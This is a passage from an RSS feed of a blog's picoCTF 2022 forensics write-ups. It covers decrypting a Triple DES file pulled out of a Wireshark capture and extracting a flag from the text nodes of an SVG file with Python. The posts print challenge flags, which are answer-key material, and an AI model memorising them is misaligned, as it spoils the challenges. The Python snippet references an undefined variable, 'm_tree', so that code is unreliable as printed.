<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl des3 -d -salt -in file.des3 -out file.txt -k supersecretpassword123</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>Ok, great, thanks.<br>
<!-- -->Let's use Discord next time, it's more secure.<br>
<!-- -->C'mon, no one knows we use this program like this!<br>
<!-- -->Whatever.<br>
<!-- -->Hey.<br>
<!-- -->Yeah?<br>
<!-- -->Could you transfer the file to me again?<br>
<!-- -->Oh great. Ok, over 9002?<br>
<!-- -->Yeah, listening.<br>
<!-- -->Sent it<br>
<!-- -->Got it.<br>
<!-- -->You're unbelievable</p>
</blockquote>
<p>So we know that the file will be sent over port <code>9002</code> and we know it's going to be encrypted using Triple DES cipher.</p>
<p>Adding the filter <code>tcp.port == 9002</code> to Wireshark, we see that the following packet contains some data</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">57	205.302713	10.0.2.15	10.0.2.4	TCP	114	56370 → 9002 [PSH, ACK] Seq=1 Ack=1 Win=64256 Len=48 TSval=3517420532 TSecr=1765870695</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we export packet as bytes (CTRL + SHIFT + X), we get the file we need to feed into OpenSSL:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&gt; openssl des3 -d -in wireshark_export.des3 -out flag.txt -k supersecretpassword123</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">*** WARNING : deprecated key derivation used.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Using -iter or -pbkdf2 would be better.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; cat flag.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{nc_73115_411_5786acc3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Enhance!]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/forensics/enhance/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/forensics/enhance/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/forensics/enhance/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p><a href="https://play.picoctf.org/events/70/challenges/challenge/265" target="_blank" rel="noopener noreferrer">https://play.picoctf.org/events/70/challenges/challenge/265</a></p>
<p>Download <a href="https://artifacts.picoctf.net/c/136/drawing.flag.svg" target="_blank" rel="noopener noreferrer">this image file</a> and find the flag.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="research">Research<a href="https://kbbgl.github.io/blog/pico_2022/forensics/enhance/README#research" class="hash-link" aria-label="Direct link to Research" title="Direct link to Research">​</a></h2>
<p>We can see that the file is a SVG:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file drawing.flag.svg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">drawing.flag.svg: SVG Scalable Vector Graphics image</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Since SVG is basically a vector-based graphics printed in XML format, it's not encoded so we can print it out as a regular text file.</p>
<p>If we look at the XML, we can see that the flag is contained with <code>tspan</code> nodes which are children of the <code>text</code> node. The <code>text</code> node is a 3rd child of <code>g</code> node which is a 3rd child of the <code>root</code>.</p>
<p>We can use Python to parse the SVG and get the flag.</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> xml</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">etree</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ElementTree </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> ET</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tree </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> ET</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">parse</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'drawing.flag.svg'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> m_tree</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">getroot</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">""</span><span class="token plain">                                            </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> s </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> root</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">getchildren</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">getchildren</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">" "</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">""</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">                  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># picoCTF{3nh4nc3d_aab729dd}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
    </channel>
</rss>